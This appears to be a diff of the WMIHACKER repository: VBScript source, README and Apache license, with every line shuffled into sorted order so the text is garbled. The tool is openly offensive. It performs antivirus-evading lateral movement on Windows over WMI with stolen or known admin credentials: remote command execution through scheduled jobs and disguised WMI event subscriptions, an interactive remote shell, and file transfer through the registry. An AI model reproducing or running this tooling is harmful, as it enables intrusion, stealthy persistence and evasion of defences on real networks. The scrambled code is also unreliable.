@@ -1,0 +1,788 @@
+    
+        
+                                 Apache License
+                              v0.6beta       By. Xiangshan@360RedTeam
+                        http://www.apache.org/licenses/
+                done = True
+            ' Add Task to the Machine.
+            ' read the res of exec and save it to reg
+            ' result as text.
+            .CharSet = sTextEncoding
+            .Close
+            .Open
+            .Position = 0
+            .Type = 1 ' adTypeBinary
+            .Type = 2 ' adTypeText
+            .Write byteArray
+            AddSCHTASKWithoutres command
+            BytesToStr = .ReadText
+            Else
+            End If
+            If return Then
+            ReadResult TargetVersion
+            WriteReg file
+            deletefile file
+            done = true
+            exec_time = GetTime()
+            exec_time = exec_time 
+            exec_time = objItem.Hour 
+            return = objItem.GetEffectivePermission(2)
+          /cmd          single command mode
+          Derivative Works a copy of this License
+          GETRES
+          as modifying the License.
+          as part of the Derivative Works
+          command       the command to run on remote host
+          do not modify the License. You may add Your own attribution
+          excluding those notices that do not pertain to any part of
+          host          hostname or IP address
+          include a readable copy of the attribution notices contained
+          of the NOTICE file are for informational purposes only and
+          of the following places: within a NOTICE text file distributed
+          stating that You changed the files
+          that such additional attribution notices cannot be construed
+          the Derivative Works
+          wherever such third-party notices normally appear. The contents
+        ' Create a binary stream and copy the input byte array to it.
+        ' take a shortcut and use CStr() to directly convert the byte array
+        ' to a string.
+        .Text = sBase64EncodedText
+        / /  
+        BytesToStr = CStr(byteArray)
+        Else
+        Else 
+        End If
+        End With
+        For Each objItem in colItems
+        If Res32 = Empty Then
+        If TargetVersion < 6 Then
+        If getres = 1 Then
+        If objItem.Hour < 10 Then 
+        If objItem.Minute < 10 Then 
+        If objItem.Second < 10 Then 
+        Next
+        ReDim Preserve arr(i)
+        Redim Preserve arr(k
+        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES
+        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath
+        WMIHACKER.vbs  /shell  host  user  pass
+        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath
+        WScript.Echo vbTab 
+        Wscript.Sleep 2000
+        arr(k
+        command = wscript.stdin.ReadLine
+        else
+        end if
+        exec_time = GetTime()
+        if getres = 1 Then
+        s = s 
+        time_zone = objItem.Bias
+        vbNewLine 
+       http://www.apache.org/licenses/LICENSE-2.0
+      (a) You must give any other recipients of the Work or
+      (an example is provided in the Appendix below).
+      (b) You must cause any modified files to carry prominent notices
+      Contribution(s) alone or by combination of their Contribution(s)
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      Work and such Derivative Works in Source or Object form.
+      You may add Your own copyright statement to Your modifications and
+      aBuf(I 
+      and conversions to other media types.
+      and distribution as defined by Sections 1 through 9 of this document.
+      any Contribution intentionally submitted for inclusion in the Work
+      appropriateness of using or redistributing the Work and assume any
+      as of the date such litigation is filed.
+      by You to the Licensor shall be under the terms and conditions of
+      by such Contributor that are necessarily infringed by their
+      comment syntax for the file format. We also recommend that a
+      copyright notice that is included in or attached to the work
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      except as required for reasonable and customary use in describing the
+      excluding communication that is conspicuously marked or otherwise
+      exercising permissions granted by this License.
+      file or class name and description of purpose be included on the
+      granted to You under this License for that Work shall terminate
+      has been advised of the possibility of such damages.
+      identification within third-party archives.
+      institute patent litigation against any entity (including a
+      may provide additional or different license terms and conditions
+      meet the following conditions:
+      of your accepting any such warranty or additional liability.
+      on behalf of whom a Contribution has been received by Licensor and
+      or a Contribution incorporated within the Work constitutes direct
+      or by an individual or Legal Entity authorized to submit on behalf of
+      or other liability obligations and/or rights consistent with this
+      origin of the Work and reproducing the content of the NOTICE file.
+      replaced with your own identifying information. (Don't include
+      result of this License or out of the use or inability to use the
+      risks associated with Your exercise of permissions under this License.
+      submitted to Licensor for inclusion in the Work by the copyright owner
+      subsequently incorporated within the Work.
+      the Work and Derivative Works thereof.
+      the brackets!)  The text should be enclosed in the appropriate
+      the conditions stated in this License.
+      the copyright owner that is granting the License.
+      the original version of the Work and any modifications or additions
+      the terms of any separate license agreement you may have executed
+      unless required by applicable law (such as deliberate and grossly
+      where such license applies only to those patent claims licensable
+      with Licensor regarding such Contributions.
+      with the Work to which such Contribution(s) was submitted. If You
+    ' Assigning the encoded text to .Text makes the decoded byte array
+    ' Use an aux. XML document with a Base64-encoded element.
+    'wscript.echo Asec.scripttext
+    'wscript.echo objItem.Version
+    .Close
+    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName
+    .Position = 2: .CopyTo bStream: .Close
+    .Type = 2 : .Open: .WriteText aBuf
+    Dim Schedule_Name
+    Dim arr()
+    Dim done
+    Dim sTextEncoding
+    Do Until done
+    Do While True
+    Else
+    Else ' Convert the specified text encoding to a VBScript string.
+    End If
+    End With
+    End if
+    For Each objItem In colItems
+    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next
+    For i = 0 To 25
+    For i = 0 To 9
+    For i = 1 To p
+    GetStringValue = oOutParams.sValue
+    GetTime = exec_time
+    If TargetVersion < 6 Then
+    If errJobCreated <> 0 Then
+    Next
+    Randomize Time()
+    ReDim Buf(.Size - 1)
+    Set asec = temp.spawninstance_
+    TargetVersionSet = objItem.Version
+    WScript.Echo vbTab 
+    WScript.Sleep 2000 ' 2 sec
+    a = 0
+    asec.delete_
+    command = objArgs.Item(4)
+    done = false
+    else
+    evtflt.delete_
+    evtflt.query=qstr                                             
+    exec_time = temp_time(0) 
+    fcbnd.consumer=asecpath.path
+    fcbnd.delete_
+    fcbnd.filter=fltpath.path
+    fcbnd.put_
+    genStr = s
+    getres = objArgs.Item(5)
+    if Version < 6 Then
+    k = UBound(arr)
+    localpath = objArgs.Item(4)
+    loop
+    oInParams.hDefKey = hDefKey
+    oInParams.sSubKeyName = SubKeyName
+    oInParams.sValueName = ValueName
+    pass = objArgs.Item(3)
+    randNum =  Int((upperbound - lowerbound 
+    remotepath = objArgs.Item(5)
+    set asecpath=asec.put_                                        
+    set evtflt = temp.spawninstance_
+    set fcbnd = temp.spawninstance_
+    set fltpath=evtflt.put_                                       
+    user = objArgs.Item(2)
+    z = UBound(arr)
+   /
+   / ____
+   1. Definitions.
+   2. Grant of Copyright License. Subject to the terms and conditions of
+   3. Grant of Patent License. Subject to the terms and conditions of
+   4. Redistribution. You may reproduce and distribute copies of the
+   6. Trademarks. This License does not grant permission to use the trade
+   7. Disclaimer of Warranty. Unless required by applicable law or
+   9. Accepting Warranty or Additional Liability. While redistributing
+   APPENDIX: How to apply the Apache License to your work.
+   Copyright [yyyy] [name of copyright owner]
+   END OF TERMS AND CONDITIONS
+   See the License for the specific language governing permissions and
+   You may obtain a copy of the License at
+   limitations under the License.
+   you may not use this file except in compliance with the License.
+  / 
+  /  
+  / /
+  < 
+  End With
+  For I = 0 To Size - 1 Step 2
+  If I = Size Then aBuf(I 
+  Next
+  ReadBinary = Buf
+  Set bStream = Nothing
+  Size = UBound(Buf): ReDim aBuf(Size 
+  _  /
+  __
+  __ 
+  __  
+  bStream.Type = 1: bStream.Open
+ ' /
+ / /
+ 1) 
+ 2) = ChrW(Buf(I 
+ 2) = ChrW(Buf(I))
+ 2. File upload
+ 256 
+ 3. File download
+ 404
+ 404Starlink
+ BlackHat Asia 2020 Arsenal
+ Buf(I))
+ Err.Description 
+ How to use
+ Rnd 
+ Schedule_Name 
+ Star History
+ WMIHACKER
+ WMIHACKER(
+ [404
+ and
+ chr(34) 
+ chr(34))
+ cmd 
+ command
+ file
+ file 
+ host
+ host 
+ lowerbound)
+ objItem.Hour 
+ objItem.Minute 
+ objItem.Second
+ retcode
+ temp_time(0)
+ temp_time(1) 
+ time_zone
+ vbNewLine 
+ vbTab 
+ wbemFlagForwardOnly )
+ wbemFlagForwardOnly)
+ within the Source form or
+"                           Version 2.0, January 2004"
+"                WScript.Echo ""WMIHACKER : COMMAND EXECTING... """
+"                WScript.Echo ""WMIHACKER : File Write Success. """
+"            ' Now change the type to text, set the encoding, and output the "
+"            AddJobWithRes command,file,exec_time,time_zone"
+"            AddJobWithoutRes command,exec_time,time_zone"
+"            AddSCHTASKWithres command, file"
+"            WScript.Echo ""WMIHACKER : File Upload Success. """
+"            WScript.Echo ""WMIHACKER : File Write Success. """
+"            command = Replace(command,"""""""", chr(34) "
+"            exec_time = ""0"" "
+"            wscript.echo ""Done!"""
+"            wscript.echo Base64Decode(Res32,False)"
+"            wscript.echo Base64Decode(Res64,False)"
+"          attribution notices from the Source form of the Work,"
+"          distribution, then any Derivative Works that You distribute must"
+"          documentation, if provided along with the Derivative Works"
+"          notices within Derivative Works that You distribute, alongside"
+"          or as an addendum to the NOTICE text from the Work, provided"
+"          pertain to any part of the Derivative Works, in at least one"
+"          that You distribute, all copyright, patent, trademark, and"
+"          within a display generated by the Derivative Works, if and"
+"          within such NOTICE file, excluding those notices that do not"
+"        ' UTF-16 LE happens to be VBScript's internal encoding, so we can"
+"        .DataType = ""bin.base64"""
+"        Base64Decode = BytesToStr(.NodeTypedValue, sTextEncoding)"
+"        If LCase(Trim(command)) = ""exit"" Then Exit Do"
+"        Res32 =  GetStringValue (""."", HKEY_LOCAL_MACHINE, ""SOFTWARE"
+"        Res64 = GetStringValue (""."", HKEY_LOCAL_MACHINE, ""SOFTWARE"
+"        Set colItems = objWMIService.ExecQuery(strQuery, ""WQL"", wbemFlagReturnImmediately "
+"        With CreateObject(""ADODB.Stream"")"
+"        arr(i) = Chr(Asc(""0"") "
+"        wscript.echo Base64Decode(Res32,False)"
+"        wscript.stdout.write(""WMIHACKER : CMD > "")"
+"       Res Need Or Not, Use 1 Or 0"
+"      ""Contribution"" shall mean any work of authorship, including"
+"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
+"      ""Derivative Works"" shall mean any work, whether in Source or Object"
+"      ""Legal Entity"" shall mean the union of the acting entity and all"
+"      ""License"" shall mean the terms and conditions for use, reproduction,"
+"      ""Licensor"" shall mean the copyright owner or entity authorized by"
+"      ""Object"" form shall mean any form resulting from mechanical"
+"      ""Source"" form shall mean the preferred form for making modifications,"
+"      ""Work"" shall mean the work of authorship, whether in Source or"
+"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
+"      ""control"" means (i) the power, direct or indirect, to cause the"
+"      (c) You must retain, in the Source form of any Derivative Works"
+"      (d) If the Work includes a ""NOTICE"" text file as part of its"
+"      (except as stated in this section) patent license to make, have made,"
+"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
+"      License. However, in accepting such obligations, You may act only"
+"      Licensor for the purpose of discussing and improving the Work, but"
+"      Notwithstanding the above, nothing herein shall supersede or modify"
+"      Object form, made available under the License, as indicated by a"
+"      To apply the Apache License to your work, attach the following"
+"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
+"      Work (including but not limited to damages for loss of goodwill,"
+"      Work or Derivative Works thereof in any medium, with or without"
+"      agreed to in writing, Licensor provides the Work (and each"
+"      and charge a fee for, acceptance of support, warranty, indemnity,"
+"      and issue tracking systems that are managed by, or on behalf of, the"
+"      boilerplate notice, with the fields enclosed by brackets ""[]"""
+"      communication on electronic mailing lists, source code control systems,"
+"      control with that entity. For the purposes of this definition,"
+"      copyright license to reproduce, prepare Derivative Works of,"
+"      defend, and hold each Contributor harmless for any liability"
+"      designated in writing by the copyright owner as ""Not a Contribution."""
+"      direction or management of such entity, whether by contract or"
+"      editorial revisions, annotations, elaborations, or other modifications"
+"      for any such Derivative Works as a whole, provided Your use,"
+"      for use, reproduction, or distribution of Your modifications, or"
+"      form, that is based on (or derived from) the Work and for which the"
+"      implied, including, without limitation, any warranties or conditions"
+"      incidental, or consequential damages of any character arising as a"
+"      including but not limited to software source code, documentation"
+"      incurred by, or claims asserted against, such Contributor by reason"
+"      liable to You for damages, including any direct, indirect, special,"
+"      means any form of electronic, verbal, or written communication sent"
+"      modifications, and in Source or Object form, provided that You"
+"      names, trademarks, service marks, or product names of the Licensor,"
+"      negligent acts) or agreed to in writing, shall any Contributor be"
+"      not limited to compiled object code, generated documentation,"
+"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
+"      of any other Contributor, and only if You agree to indemnify,"
+"      of this License, Derivative Works shall not include works that remain"
+"      on Your own behalf and on Your sole responsibility, not on behalf"
+"      or contributory patent infringement, then any patent licenses"
+"      other commercial damages or losses), even if such Contributor"
+"      other entities that control, are controlled by, or are under common"
+"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
+"      outstanding shares, or (iii) beneficial ownership of such entity."
+"      publicly display, publicly perform, sublicense, and distribute the"
+"      represent, as a whole, an original work of authorship. For the purposes"
+"      reproduction, and distribution of the Work otherwise complies with"
+"      same ""printed page"" as the copyright notice for easier"
+"      separable from, or merely link (or bind by name) to the interfaces of,"
+"      source, and configuration files."
+"      the Work or Derivative Works thereof, You may choose to offer,"
+"      the copyright owner. For the purposes of this definition, ""submitted"""
+"      this License, each Contributor hereby grants to You a perpetual,"
+"      this License, without any additional terms or conditions."
+"      to that Work or Derivative Works thereof, that is intentionally"
+"      to the Licensor or its representatives, including but not limited to"
+"      transformation or translation of a Source form, including but"
+"      use, offer to sell, sell, import, and otherwise transfer the Work,"
+"      v0.6beta       By. Xiangshan@360RedTeam """
+"      whether in tort (including negligence), contract, or otherwise,"
+"      work stoppage, computer failure or malfunction, or any and all"
+"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
+"    ""            .NodeTypedValue = StrToBytes(sText, "" "
+"    ""        .Charset = sTextEncoding"""
+"    ""        .Close"""
+"    ""        .DataType = "" "
+"    ""        .Open"""
+"    ""        .Position = 0 """
+"    ""        .Position = iBomByteCount """
+"    ""        .Type = 1  """
+"    ""        .Type = 2"""
+"    ""        .WriteText sText"""
+"    ""        Base64Encode = .Text"""
+"    ""        StrToBytes = .Read"""
+"    ""        else"""
+"    ""        end if"""
+"    ""        if fAsUtf16LE then"""
+"    ""    Else"""
+"    ""    End If"""
+"    ""    End With """
+"    ""    End With"""
+"    ""    If UCase(LoginUser) = "" "
+"    ""    LoginUser = Empty"""
+"    ""    With CreateObject("" "
+"    """""
+"    ""Action.Path = "" "
+"    ""Action.arguments = chr(34) "
+"    ""Call rootFolder.DeleteTask("" "
+"    ""Call rootFolder.RegisterTaskDefinition("" "
+"    ""Call service.Connect"""
+"    ""Const ActionTypeExec = 0 """
+"    ""Dim Action"""
+"    ""Dim objNet, LoginUser"""
+"    ""Dim regInfo"""
+"    ""Dim rootFolder"""
+"    ""Dim settings"""
+"    ""Dim taskDefinition"""
+"    ""Dim trigger"""
+"    ""Dim triggers"""
+"    ""End Function"""
+"    ""Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)"""
+"    ""LoginUser = objNet.UserName"""
+"    ""Set Action = taskDefinition.Actions.Create(ActionTypeExec)"""
+"    ""Set objNet = CreateObject("" "
+"    ""Set regInfo = taskDefinition.RegistrationInfo"""
+"    ""Set rootFolder = service.GetFolder("" "
+"    ""Set service = CreateObject("" "
+"    ""Set settings = taskDefinition.settings"""
+"    ""Set taskDefinition = service.NewTask(0)"""
+"    ""Set trigger = triggers.Create(7)"""
+"    ""Set triggers = taskDefinition.triggers"""
+"    ""b64_content = Base64Encode(content, false)"""
+"    ""content= ts.readall"""
+"    ""end function"""
+"    ""function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)"""
+"    ""path="" "
+"    ""regInfo.Author = "" "
+"    ""regInfo.Description = "" "
+"    ""set fs = createobject("" "
+"    ""set ts = fs.opentextfile("" "
+"    ""settings.DisallowStartIfOnBatteries = False"""
+"    ""settings.Enabled = True"""
+"    ""settings.Hidden = False"""
+"    ""settings.StartWhenAvailable = True"""
+"    ""ts.close"""
+"    ""val=ws.regwrite(path"
+"    ' available via .nodeTypedValue, which we can pass to BytesToStr()"
+"    Asec.scriptingengine=""vbscript"""
+"    Asec.scripttext = ""Const TriggerTypeDaily = 1 """
+"    Asec.scripttext = ""Set objRegistry = GetObject("" "
+"    Asec.scripttext = ""arrData=ReadBinary("" "
+"    Asec.scripttext = ""set ws=createobject("" "
+"    Dim Res32, Res64"
+"    Dim a, z, s, i, p, k"
+"    Dim oCtx: Set oCtx = CreateObject(""WbemScripting.SWbemNamedValueSet"")"
+"    Dim oInParams: Set oInParams = oReg.Methods_(""GetStringValue"").InParameters"
+"    Dim oOutParams: Set oOutParams = oReg.ExecMethod_(""GetStringValue"", oInParams, , oCtx)"
+"    Download localpath,remotepath"
+"    If LCase(sTextEncoding) = ""utf-16le"" then"
+"    ReplacedFile = Replace(file,"""
+"    Schedule_Name = genStr(6,12)"
+"    Set colItems = objWMIService.ExecQuery(""SELECT "
+"    Set oReg = regWMIService.Get(""StdRegProv"")"
+"    Set objNewJob = objWMIService.Get(""Win32_ScheduledJob"")"
+"    Set temp = SubobjSWbemServices.Get(""ActiveScriptEventConsumer"")"
+"    Set temp = SubobjSWbemServices.Get(""__EventFilter"")"
+"    Set temp = SubobjSWbemServices.Get(""__FilterToConsumerBinding"")"
+"    Upload localpath,remotepath"
+"    WScript.Echo ""Read File To Reg Success"""
+"    WScript.Echo(""WMIHACKER : Welcome to WMIHACKER Shell"")"
+"    With CreateObject(""Msxml2.DOMDocument"").CreateElement(""aux"")"
+"    Wscript.Echo ""File Download Success"""
+"    asec.name=""Windows COM Config Consumer"""
+"    errJobCreated = objNewJob.Create(command, exec_time, True , , , True, JobId)"
+"    evtflt.EventNameSpace=""root"
+"    evtflt.name=""Windows COM Config Filter"" "
+"    evtflt.querylanguage=""wql""                                    "
+"    exec_time = """
+"    if fIsUtf16LE Then sTextEncoding = ""utf-16le"" Else sTextEncoding = ""utf-8"""
+"    oCtx.Add ""__ProviderArchitecture"", Architecture"
+"    oCtx.Add ""__RequiredArchitecture"", True"
+"    p = randNum(n, m)"
+"    qstr = ""SELECT "
+"    s = """""
+"    strQuery = ""SELECT "
+"    temp_time = DateAdd(""s"",61,CDate(exec_time))"
+"    temp_time = Split(temp_time,"":"")"
+"    wscript.echo ""WMIHACKER : COMMAND EXEC SUCCESS, Wait to write in reg."""
+"    wscript.echo ""WMIHACKER : COMMAND EXEC SUCCESS."""
+"    wscript.echo ""WMIHACKER : REG WRITE SUCCESS, Wait to read the res."""
+"    wscript.echo ""WMIHACKER : The Schedule Name is "" "
+"   5. Submission of Contributions. Unless You explicitly state otherwise,"
+"   8. Limitation of Liability. In no event and under no legal theory,"
+"   Licensed under the Apache License, Version 2.0 (the ""License"")"
+"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
+"   Unless required by applicable law or agreed to in writing, software"
+"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
+"   distributed under the License is distributed on an ""AS IS"" BASIS,"
+"  Dim Buf(), I"
+"  Dim I, aBuf, Size, bStream"
+"  Set bStream = CreateObject(""ADODB.Stream"")"
+"  WScript.Echo ""An error occurred. Return code: "" "
+"  WScript.Echo ""Binary value added successfully"""
+"  With CreateObject(""ADODB.Stream"")"
+"  _  / """
+"  aBuf=Join(aBuf, """")"
+"  bStream.SaveToFile FileName, 2: bStream.Close"
+" ""  /cmd"" "
+" ""  >>  "" "
+" ""  GETRES"
+" ""  command"" "
+" ""  host"" "
+" "" > "" "
+" """" "
+" "")"""
+" "").CreateElement("" "
+" "", 2)"""
+" "", 3)"""
+" "", arrData)"""
+" "","" "
+" "",b64_content)"""
+" "",strValue"""
+" ""."" "
+" ""0"" "
+" "":"""
+" ""ADODB.Stream"" "
+" ""HKEY_LOCAL_MACHINE"
+" ""Msxml2.DOMDocument"" "
+" ""Part2"" "
+" ""Res Need Or Not, Use 1 Or 0"" "
+" ""SOFTWARE"
+" ""WMIHACKER.vbs  /cmd  host  user  pass  command GETRES"
+" ""WMIHACKER.vbs  /download  host  user  pass  localpath remotepath"" "
+" ""WMIHACKER.vbs  /shell  host  user  pass "" "
+" ""WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath"" "
+" ""aux"" "
+" ""bin.base64"" "
+" ""hostname or IP address"" "
+" ""part1"" "
+" ""scripting.filesystemobject"" "
+" ""single command mode"" "
+" ""the command to run on remote host"""
+" ""utf-16le"" "
+" ""utf-8"" "
+" ""winmgmts:{impersonationLevel=impersonate}!"
+" ""wscript.shell"" "
+" 2) = ChrW(Buf(I))"""
+" 2)"""
+" Buf(I))"""
+" FROM CIM_DataFile where name="""
+" FROM Win32_LocalTime"", ""WQL"", wbemFlagReturnImmediately "
+" FROM Win32_OperatingSystem"""
+" FROM Win32_TimeZone"", ""WQL"", wbemFlagReturnImmediately "
+" FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"""
+" Temp Result File , Change it to where you like"
+" arr(randNum(a, z))"
+" chr(34)"""
+" or,"
+"""      aBuf(I "
+"""    .Close"""
+"""    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName"""
+"""    .Position = 2: .CopyTo bStream: .Close"""
+"""    .Type = 2 : .Open: .WriteText aBuf"""
+"""    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next"""
+"""    ReDim Buf(.Size - 1)"""
+"""  Dim Buf(), I"""
+"""  Dim I, aBuf, Size, bStream"""
+"""  End With"""
+"""  For I = 0 To Size - 1 Step 2"""
+"""  If I = Size Then aBuf(I "
+"""  Next"""
+"""  ReadBinary = Buf"""
+"""  Set bStream = CreateObject("" "
+"""  Set bStream = Nothing"""
+"""  Size = UBound(Buf): ReDim aBuf(Size "
+"""  With CreateObject("" "
+"""  aBuf=Join(aBuf, "" "
+"""  bStream.SaveToFile FileName, 2: bStream.Close"""
+"""  bStream.Type = 1: bStream.Open"""
+""" > """
+""" Then"""
+""", ""part1"", 32, Version)"
+""", ""part1"", 64, Version)"
+""", taskDefinition, 6, LoginUser, , 3)"""
+""",0)"""
+""",1)"""
+""",strValue"""
+"""/c """
+"""00.000000"""
+"""End Function"""
+"""End Sub"""
+"""Function ReadBinary(FileName)"""
+"""Microsoft"" "
+"""SYSTEM"" "
+"""Schedule.Service"" "
+"""Set objRegistry = GetObject("" "
+"""Sub WriteBinary(FileName, Buf)"""
+"""Update"" "
+"""WScript.Network"" "
+"""WriteBinary """
+"""objRegistry.CreateKey 2147483650, "" "
+"""objRegistry.GetBinaryValue 2147483650,"" "
+"""retcode = objRegistry.SetBinaryValue(2147483650, "" "
+"1.txt"" 0"
+"<img src=""https://github.com/knownsec/404StarLink-Project/raw/master/logo.png"" width=""30%"">"
+"> Disclaimer: The technology involved in this project is only for security learning and  defense purposes, illegal use is prohibited!"
+"> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator ""Password!"" ""systeminfo > c:"
+"> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator ""Password!"" ""systeminfo"" 1"
+"> cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator ""Password!"" "
+"> cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator ""Password!"" ""c:"
+"> cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator ""Password!"" ""c:"
+"Const FileName = ""appdata.txt"" "
+"Const Path = ""C:"
+"Const strKeyPath = ""SOFTWARE"
+"Const strName = ""Part2"""
+"ElseIf objArgs.Item(0) = ""/shell"" Then "
+"Elseif objArgs.Item(0) = ""/download"" Then"
+"Elseif objArgs.Item(0) = ""/shell"" Then"
+"Elseif objArgs.Item(0) = ""/upload"" Then"
+"Function AddJobWithRes(cmd,file,exec_time,time_zone)"
+"Function AddJobWithoutRes(cmd,exec_time,time_zone)"
+"Function AddSCHTASKWithres(cmd,file)"
+"Function Base64Decode(ByVal sBase64EncodedText, ByVal fIsUtf16LE)"
+"Function Download(localpath,remotepath)"
+"Function GetStringValue (ByVal Resource, ByVal hDefKey, ByVal SubKeyName, ByVal ValueName, ByVal Architecture, ByVal Version)"
+"Function Upload(localpath,remotepath)"
+"Function genStr(n,m)"
+"Function randNum(lowerbound,upperbound)"
+"If objArgs.Item(0) = ""/cmd"" Then"
+"Introduction: The common WMIEXEC, PSEXEC tool execution command is to create a service or call Win32_Process.create, these methods have been intercepted by Anti-virus software 100%, so we created WMIHACKER (Bypass anti-virus software lateral movement command execution test tool"
+"ReplacedFile = Replace(file,"""
+"Set SubobjSWbemServices = objLocator.ConnectServer(host, ""root"
+"Set colItems = objWMIService.ExecQuery(strQuery, ""WQL"", wbemFlagReturnImmediately "
+"Set objLocator = CreateObject(""wbemscripting.swbemlocator"")"
+"Set objRegistry = regWMIService.Get(""StdRegProv"")"
+"Set objWMIService = objLocator.ConnectServer(host,""root/cimv2"")"
+"Set regWMIService = objLocator.ConnectServer(host, ""root"
+"Set temp = SubobjSWbemServices.Get(""ActiveScriptEventConsumer"")"
+"Sub WriteBinary(FileName, Buf)"
+"TargetVersionSet = Split(TargetVersionSet,""."")"
+"WScript.Echo ""    "
+"WScript.Echo ""   "
+"WScript.Echo ""  "
+"WScript.Echo "" "
+"WScript.Echo """
+"WScript.Echo ""Usage: "" "
+"WScript.Echo ""WMIHACKER : Connecting..."""
+"WScript.Echo ""WMIHACKER : Login -> OK"""
+"WScript.Echo ""WMIHACKER : Target -> "" "
+"WScript.Echo ""WMIHACKER ERROR: "" "
+"WScript.Echo ""__          ____  __ _____   _    _          _____ _  ________ _____  """
+"WriteBinary localpath, arrData"
+"Wscript.Echo ""WMIHACKER : Done. Task created Wait For Exec...(Max Time is 00:59)"""
+"Wscript.Echo ""WMIHACKER : Error on task creation"""
+"Wscript.Echo ""WMIHACKER : Task created Wait For Exec...(Max Time is 00:59)"""
+"calc"" ""c:"
+"calc"""
+"calc.exe"" "
+"calc.exe"" ""c:"
+"cimv2""                         "
+"cmd.exe /c "" "
+"cmd.exe"" "
+"command = ""c:"
+"default"")"
+"default"", user, pass)"
+"default:StdRegProv"" "
+"function BytesToStr(ByVal byteArray, ByVal sTextEncoding)"
+"hello"" "
+"hello"""
+"i) = Chr(Asc(""A"") "
+"i) = Chr(Asc(""a"") "
+"if objArgs.Item(0) = ""/cmd"" Then"
+"if user = ""-"" And pass = ""-"" Then"
+"objRegistry.CreateKey HKEY_LM, strKeyPath"
+"retcode = objRegistry.GetBinaryValue(HKEY_LOCAL_MACHINE, strKeyPath, strName, arrData)"
+"retcode = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE, strKeyPath, strName, arrData)"
+"set colItems = objWMIService.ExecQuery(strQuery,""WQL"", wbemFlagReturnImmediately "
+"set objWMIService = objLocator.connectserver(host,""root/cimv2"")"
+"set objWMIService = objLocator.connectserver(host,""root/cimv2"",user,pass)"
+"strQuery = ""SELECT "
+"subscription"")"
+"subscription"", user, pass)"
+"temp_time(0) = ""0"" "
+"time_zone = """
+'On Error Resume Next
+'wscript.echo ReplacedFile
+(Chinese version)](README_zh.md)
+/   
+/ / 
+/ /  ____
+/ ____ 
+100%
+54-58
+Bypass anti-virus software lateral movement command execution test tool
+Chr(34)
+Classes
+Const HKEY_LOCAL_MACHINE = 
+Const timeOut = 3000 ' 1000ms = 1s
+Const wbemFlagForwardOnly = 
+Const wbemFlagReturnImmediately = 
+Date)
+Desktop>cscript //nologo WMIHACKER_0.6.vbs
+Dim time_zone
+Else
+End Function
+End IF
+End IF 
+End If
+End Sub
+File download: Download the remote host calc.exe to the local c:
+File upload: copy the local calc.exe to the remote host c:
+FileName
+For Each objItem in colItems
+Function AddSCHTASKWithoutres(cmd)
+Function GetTime()
+Function ReadBinary(FileName)
+Function ReadFileFromReg(file)
+Function ReadResult(Version)
+Function WriteFileFromReg(file)
+Function WriteReg(file)
+Function deletefile(file)
+H80000002
+If (retcode = 0) And (Err.Number = 0) Then
+If Err.Number <> 0 Then
+If intArgCount < 2 Or intArgCount > 6 Then
+If intArgCount >2 Then
+Main functions: 1. Command execution
+Next
+No need 445 Port
+No results are displayed after the command is executed
+PSEXEC
+ReadFileFromReg(remotepath)
+ReplacedFile
+SOFTWARE
+Schedule_Name
+Set objArgs = WScript.Arguments
+TargetVersion =  TargetVersionSet(0)
+Temp
+The result is displayed after the command is executed
+Usage:
+Users
+WMIEXEC
+WMIHACKER
+WMIHACKER 
+WMIHACKER has joined [404Starlink](https://github.com/knownsec/404StarLink)
+WScript.Echo 
+WScript.Quit
+WScript.Quit()
+Win32_Process.create
+Windows
+WriteFileFromReg(remotepath)
+[![Star History Chart](https://api.star-history.com/svg
+[Issue 1](https://github.com/360-Linton-Lab/WMIHACKER/issues/1)
+[https://www.blackhat.com/asia-20/arsenal/schedule/
+](https://github.com/knownsec/404StarLink)
+_   _
+_/_/    
+__  
+__          ____  __ _____   _    _          _____ _  ________ _____
+__) 
+____
+_____
+______
+administrator
+arrData = ReadBinary(localpath)
+calc.exe
+chr(10)
+chr(34)
+end function
+exec_time
+file
+file = Path
+hello
+host = objArgs.Item(1)
+if temp_time(0) < 10 Then
+if time_zone > 0 Then
+intArgCount = objArgs.Count
+mimikatz
+objItem.delete_
+repos=rootclay/WMIHACKER
+root
+rootclay/WMIHACKER
+shell
+shell mode
+system32
+time_zone
+type=Date)](https://star-history.com/
+vbNewLine 
+vbscript
+windows
+wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995)
+wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995](https://www.blackhat.com/asia-20/arsenal/schedule/
